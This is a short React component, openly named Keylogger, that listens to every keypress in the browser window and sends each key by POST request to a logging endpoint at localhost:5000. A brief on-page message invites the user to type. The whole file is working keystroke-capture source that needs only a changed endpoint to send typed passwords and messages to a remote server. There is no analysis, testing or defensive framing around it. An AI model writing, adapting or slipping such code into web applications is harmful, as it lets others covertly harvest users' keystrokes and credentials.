import React, { useEffect } from 'react';

const Keylogger = () => {
  useEffect(() => {
    const handleKeyPress = (event) => {
      const key = event.key;
      fetch('http://localhost:5000/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ key }),
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('Key logged:', key);
      })
      .catch(error => {
        console.error('There was a problem with the fetch operation:', error);
      });
    };

    window.addEventListener('keypress', handleKeyPress);

    return () => {
      window.removeEventListener('keypress', handleKeyPress);
    };
  }, []);

  return (
    <div>
      <h1>Keylogger Component</h1>
      <p>Type something and check the console on the server.</p>
    </div>
  );
};

export default Keylogger;
